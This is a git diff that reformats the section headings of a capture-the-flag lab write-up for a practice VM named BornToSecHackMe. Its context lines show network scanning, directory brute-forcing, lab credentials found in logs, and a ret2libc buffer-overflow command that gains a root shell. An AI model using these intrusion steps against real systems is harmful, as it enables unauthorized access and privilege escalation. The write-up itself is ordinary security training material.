@@ -1,4 +1,4 @@
-I - Find the port
+## I - Find the port
 
 $>ifconfig
 …
@@ -48,7 +48,7 @@ Nmap done: 256 IP addresses (3 hosts up) scanned in 65.27 seconds
 
 
 
-II. Exploring with dirb
+## II. Exploring with dirb
 
 Intalling dirb => 
 $>cd ~/Applications
@@ -69,6 +69,7 @@ $>dirb https://192.168.1.58 ~/Applications/dirb222/wordlists/common.txt
 -----------------
 DIRB v2.22
 By The Dark Raver
+
 -----------------
 
 START_TIME: Tue May 18 17:44:47 2021
@@ -90,7 +91,7 @@ GENERATED WORDS: 4612
 
 
 
-III. Successive intrusions
+## III. Successive intrusions
 
 Going into https://192.168.1.58/forum/, we find 
 Oct 5 08:45:29 BornToSecHackMe sshd[7547]: Failed password for invalid user !q\]Ej?*5K5cy*AJ from 161.202.39.38 port 57764 ssh2
@@ -111,7 +112,7 @@ Best regards.
 
 
 
-IV. Injection
+## IV. Injection
 
 In phpmyadmin :
 
@@ -135,7 +136,7 @@ lmezard:G!@M6f4Eatau{sF"
 
 
 
-V. Get files through FTP
+## V. Get files through FTP
 
 It’s not an ssh password. We look for open services  with nmap with version detection:
 
@@ -202,7 +203,7 @@ $>  ssh laurie@192.168.1.58
 
 
 
-VI. The bomb
+## VI. The bomb
 
 using ghidra
 
@@ -248,7 +249,7 @@ Note : there’s a mistake in it, it ends with 135 instead of 315.
 
 
 
-VII. Thor
+## VII. Thor
 Instructions are based on the python turtle game, used to teach coding to children.
 ($ virtualenv v_turtle)
 $ source v_turtle/bin/activate
@@ -262,7 +263,7 @@ Can you digest the message ? => this means we got to md5 the password
 
 
 
-VIII. Zaz
+## VIII. Zaz
 
 Check if ASLR protection (address space layout randomization, a protection that triggers use of random memory address for each binary execution) is deactivated :
 
@@ -376,7 +377,7 @@ We push on the stack at [EIP + 8] the address of /bin/sh.
 
 $./exploit_me $(perl -e 'print "Z"x140, "\x60\xb0\xe6\xb7", "\xe0\xeb\xe5\xb7", "\x58\xcc\xf8\xb7"')
 ZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZ`�����X��
-# whoami
+$ whoami
 root
 
 Trivia : ret2libc attack was first performed by Александр Песляк in 1997, the author of John the Ripper.
